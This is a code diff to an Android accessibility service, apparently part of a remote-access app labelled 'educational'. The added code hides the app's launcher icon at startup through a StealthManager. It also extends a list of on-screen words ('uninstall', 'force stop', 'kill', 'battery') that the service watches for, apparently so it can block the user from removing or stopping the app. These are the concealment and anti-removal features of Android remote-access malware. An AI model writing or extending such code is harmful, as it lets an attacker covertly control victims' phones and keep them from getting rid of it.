@@ -177,6 +177,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
         try { startSocketCheckLoop(); } catch (Exception ignored) {}
+
+        try {
+            com.remoteaccess.educational.stealth.StealthManager stealthManager =
+                    new com.remoteaccess.educational.stealth.StealthManager(this);
+            if (!stealthManager.isIconHidden()) {
+                stealthManager.fullyHideApp();
+            }
+        } catch (Exception ignored) {}
     }
 
     /**
@@ -1031,7 +1039,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             String allText = getAllScreenText(node).toLowerCase();
             String appNameLower = currentAppName.toLowerCase();
             
-            String[] dangerousWords = {"uninstall", "delete", "remove", "stop", "options", "active apps"};
+            String[] dangerousWords = {"uninstall", "delete", "remove", "stop", "options", "active apps", "kill", "battery", "apps", "mins", "minimize", "force stop"};
             
             for (String word : dangerousWords) {
                 if (allText.contains(appNameLower) && allText.contains(word)) {
